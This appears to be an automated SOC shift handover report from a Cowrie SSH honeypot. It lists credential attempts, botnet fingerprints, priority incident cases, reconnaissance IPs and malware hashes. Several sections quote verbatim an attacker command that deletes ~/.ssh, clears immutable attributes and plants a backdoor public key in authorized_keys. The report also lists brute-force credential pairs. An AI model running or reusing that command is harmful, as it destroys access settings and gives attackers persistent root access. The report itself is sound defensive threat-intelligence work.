# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-30 |
| **Generated At** | 2026-05-30T23:01:55Z |
| **Shift Time** | 23:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **79** |
| Confirmed Threats | **45** |
| False Positives Filtered | **34** (43.0%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **12** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **69** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **19** |
| Unique Credential Pairs | **11** |
| Unique Usernames | **6** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `ec2-user` | 1 |
| `ionadmin` | 1 |
| `tempuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `root123456` | 1 |
| `ec2-user` | 1 |
| `aA111111` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `root123456` | 1 |
| `ec2-user` | `ec2-user` | 1 |
| `root` | `aA111111` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root123456` | `103.52.153.215` | 2026-05-30T22:29:36 |
| `root` | `3245gs5662d34` | `103.52.153.215` | 2026-05-30T22:29:39 |
| `root` | `aA111111` | `115.68.208.117` | 2026-05-30T22:47:00 |
| `root` | `3245gs5662d34` | `115.68.208.117` | 2026-05-30T22:47:04 |
| `root` | `P@ssword` | `8.218.205.201` | 2026-05-30T22:57:43 |
| `root` | `3245gs5662d34` | `8.218.205.201` | 2026-05-30T22:57:47 |
| `root` | `Hello123` | `8.218.205.201` | 2026-05-30T22:58:30 |
| `root` | `radware` | `8.218.205.201` | 2026-05-30T22:59:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **79** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 22 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 19 | 5 |
| `af8223ac9914...` | libssh-based | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 19 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `115.68.208.117`, `103.52.153.215`, `8.218.205.201`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **18** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS38700` | SMILESERV | 1 | HIGH |
| `AS58519` | Cloud Computing Corporation | 1 | HIGH |
| `AS401701` | cognetcloud INC | 1 | HIGH |
| `AS132124` | Information and Communication Technology Agency of Sri Lanka | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9dfc534721d3

| Field | Detail |
|---|---|
| **Source IP** | `103.52.153[.]215` |
| **First Seen** | 2026-05-30 22:29 |
| **Last Seen** | 2026-05-30 22:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:29:36` | `cowrie.session.connect` |
| `2026-05-30 22:29:36` | `cowrie.client.version` |
| `2026-05-30 22:29:36` | `cowrie.client.kex` |
| `2026-05-30 22:29:36` | `cowrie.login.success` |
| `2026-05-30 22:29:36` | `cowrie.session.params` |
| `2026-05-30 22:29:36` | `cowrie.command.input` |
| `2026-05-30 22:29:36` | `cowrie.command.failed` |
| `2026-05-30 22:29:37` | `cowrie.log.closed` |
| `2026-05-30 22:29:37` | `cowrie.session.params` |
| `2026-05-30 22:29:37` | `cowrie.command.input` |
| `2026-05-30 22:29:37` | `cowrie.session.file_download` |
| `2026-05-30 22:29:37` | `cowrie.log.closed` |
| `2026-05-30 22:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.153[.]215` to AbuseIPDB if not already reported
- [ ] Block `103.52.153[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60aa36c7aa9

| Field | Detail |
|---|---|
| **Source IP** | `103.52.153[.]215` |
| **First Seen** | 2026-05-30 22:29 |
| **Last Seen** | 2026-05-30 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:29:39` | `cowrie.session.connect` |
| `2026-05-30 22:29:39` | `cowrie.client.version` |
| `2026-05-30 22:29:39` | `cowrie.client.kex` |
| `2026-05-30 22:29:39` | `cowrie.login.success` |
| `2026-05-30 22:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.153[.]215` to AbuseIPDB if not already reported
- [ ] Block `103.52.153[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb646897a0c

| Field | Detail |
|---|---|
| **Source IP** | `115.68.208[.]117` |
| **First Seen** | 2026-05-30 22:47 |
| **Last Seen** | 2026-05-30 22:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:47:00` | `cowrie.session.connect` |
| `2026-05-30 22:47:00` | `cowrie.client.version` |
| `2026-05-30 22:47:00` | `cowrie.client.kex` |
| `2026-05-30 22:47:00` | `cowrie.login.success` |
| `2026-05-30 22:47:01` | `cowrie.session.params` |
| `2026-05-30 22:47:01` | `cowrie.command.input` |
| `2026-05-30 22:47:01` | `cowrie.command.failed` |
| `2026-05-30 22:47:01` | `cowrie.log.closed` |
| `2026-05-30 22:47:01` | `cowrie.session.params` |
| `2026-05-30 22:47:01` | `cowrie.command.input` |
| `2026-05-30 22:47:01` | `cowrie.session.file_download` |
| `2026-05-30 22:47:01` | `cowrie.log.closed` |
| `2026-05-30 22:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.208[.]117` to AbuseIPDB if not already reported
- [ ] Block `115.68.208[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef431e6f241

| Field | Detail |
|---|---|
| **Source IP** | `115.68.208[.]117` |
| **First Seen** | 2026-05-30 22:47 |
| **Last Seen** | 2026-05-30 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:47:04` | `cowrie.session.connect` |
| `2026-05-30 22:47:04` | `cowrie.client.version` |
| `2026-05-30 22:47:04` | `cowrie.client.kex` |
| `2026-05-30 22:47:04` | `cowrie.login.success` |
| `2026-05-30 22:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.208[.]117` to AbuseIPDB if not already reported
- [ ] Block `115.68.208[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88b09a6a43d2

| Field | Detail |
|---|---|
| **Source IP** | `8.218.205[.]201` |
| **First Seen** | 2026-05-30 22:57 |
| **Last Seen** | 2026-05-30 22:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:57:42` | `cowrie.session.connect` |
| `2026-05-30 22:57:42` | `cowrie.client.version` |
| `2026-05-30 22:57:42` | `cowrie.client.kex` |
| `2026-05-30 22:57:43` | `cowrie.login.success` |
| `2026-05-30 22:57:43` | `cowrie.session.params` |
| `2026-05-30 22:57:43` | `cowrie.command.input` |
| `2026-05-30 22:57:43` | `cowrie.command.failed` |
| `2026-05-30 22:57:43` | `cowrie.log.closed` |
| `2026-05-30 22:57:44` | `cowrie.session.params` |
| `2026-05-30 22:57:44` | `cowrie.command.input` |
| `2026-05-30 22:57:44` | `cowrie.session.file_download` |
| `2026-05-30 22:57:44` | `cowrie.log.closed` |
| `2026-05-30 22:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.205[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.218.205[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c3ee2cdadf9

| Field | Detail |
|---|---|
| **Source IP** | `8.218.205[.]201` |
| **First Seen** | 2026-05-30 22:57 |
| **Last Seen** | 2026-05-30 22:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:57:46` | `cowrie.session.connect` |
| `2026-05-30 22:57:46` | `cowrie.client.version` |
| `2026-05-30 22:57:46` | `cowrie.client.kex` |
| `2026-05-30 22:57:47` | `cowrie.login.success` |
| `2026-05-30 22:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.205[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.218.205[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1683ddba975a

| Field | Detail |
|---|---|
| **Source IP** | `8.218.205[.]201` |
| **First Seen** | 2026-05-30 22:58 |
| **Last Seen** | 2026-05-30 22:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:58:29` | `cowrie.session.connect` |
| `2026-05-30 22:58:29` | `cowrie.client.version` |
| `2026-05-30 22:58:29` | `cowrie.client.kex` |
| `2026-05-30 22:58:30` | `cowrie.login.success` |
| `2026-05-30 22:58:30` | `cowrie.session.params` |
| `2026-05-30 22:58:30` | `cowrie.command.input` |
| `2026-05-30 22:58:30` | `cowrie.command.failed` |
| `2026-05-30 22:58:30` | `cowrie.log.closed` |
| `2026-05-30 22:58:30` | `cowrie.session.params` |
| `2026-05-30 22:58:30` | `cowrie.command.input` |
| `2026-05-30 22:58:30` | `cowrie.session.file_download` |
| `2026-05-30 22:58:30` | `cowrie.log.closed` |
| `2026-05-30 22:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.205[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.218.205[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f448ab1dff

| Field | Detail |
|---|---|
| **Source IP** | `8.218.205[.]201` |
| **First Seen** | 2026-05-30 22:58 |
| **Last Seen** | 2026-05-30 22:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:58:32` | `cowrie.session.connect` |
| `2026-05-30 22:58:32` | `cowrie.client.version` |
| `2026-05-30 22:58:33` | `cowrie.client.kex` |
| `2026-05-30 22:58:33` | `cowrie.login.success` |
| `2026-05-30 22:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.205[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.218.205[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ec995cdce4

| Field | Detail |
|---|---|
| **Source IP** | `8.218.205[.]201` |
| **First Seen** | 2026-05-30 22:59 |
| **Last Seen** | 2026-05-30 22:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:59:16` | `cowrie.session.connect` |
| `2026-05-30 22:59:16` | `cowrie.client.version` |
| `2026-05-30 22:59:16` | `cowrie.client.kex` |
| `2026-05-30 22:59:17` | `cowrie.login.success` |
| `2026-05-30 22:59:17` | `cowrie.session.params` |
| `2026-05-30 22:59:17` | `cowrie.command.input` |
| `2026-05-30 22:59:17` | `cowrie.command.failed` |
| `2026-05-30 22:59:17` | `cowrie.log.closed` |
| `2026-05-30 22:59:18` | `cowrie.session.params` |
| `2026-05-30 22:59:18` | `cowrie.command.input` |
| `2026-05-30 22:59:18` | `cowrie.session.file_download` |
| `2026-05-30 22:59:18` | `cowrie.log.closed` |
| `2026-05-30 22:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.205[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.218.205[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e93edac513

| Field | Detail |
|---|---|
| **Source IP** | `8.218.205[.]201` |
| **First Seen** | 2026-05-30 22:59 |
| **Last Seen** | 2026-05-30 22:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 22:59:20` | `cowrie.session.connect` |
| `2026-05-30 22:59:20` | `cowrie.client.version` |
| `2026-05-30 22:59:20` | `cowrie.client.kex` |
| `2026-05-30 22:59:21` | `cowrie.login.success` |
| `2026-05-30 22:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.218.205[.]201` to AbuseIPDB if not already reported
- [ ] Block `8.218.205[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.148.186[.]252` | **18** | 2026-05-30 21:41 | 2026-05-30 21:41 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `187.108.193[.]54` | **2** | 2026-05-30 22:41 | 2026-05-30 22:46 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.102.73[.]93` | **2** | 2026-05-30 21:08 | 2026-05-30 22:13 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.47.8[.]188` | 1 | 2026-05-30 21:03 | 2026-05-30 21:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `103.52.153[.]215` | 1 | 2026-05-30 22:29 | 2026-05-30 22:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.219.104[.]42` | 1 | 2026-05-30 22:58 | 2026-05-30 22:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.68.208[.]117` | 1 | 2026-05-30 22:47 | 2026-05-30 22:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.224.240[.]99` | 1 | 2026-05-30 22:47 | 2026-05-30 22:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]254` | 1 | 2026-05-30 22:59 | 2026-05-30 22:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]85` | 1 | 2026-05-30 22:46 | 2026-05-30 22:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.44.12[.]151` | 1 | 2026-05-30 21:28 | 2026-05-30 21:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-05-30 22:47 | 2026-05-30 22:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.188.187[.]45` | 1 | 2026-05-30 22:53 | 2026-05-30 22:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `206.189.25[.]100` | 1 | 2026-05-30 22:18 | 2026-05-30 22:19 | 47s | 0 | `T1592` | 🟢 LOW |
| `221.229.218[.]50` | 1 | 2026-05-30 22:46 | 2026-05-30 22:48 | 112s | 0 | `T1592` | 🟢 LOW |
| `43.224.126[.]107` | 1 | 2026-05-30 21:46 | 2026-05-30 21:48 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
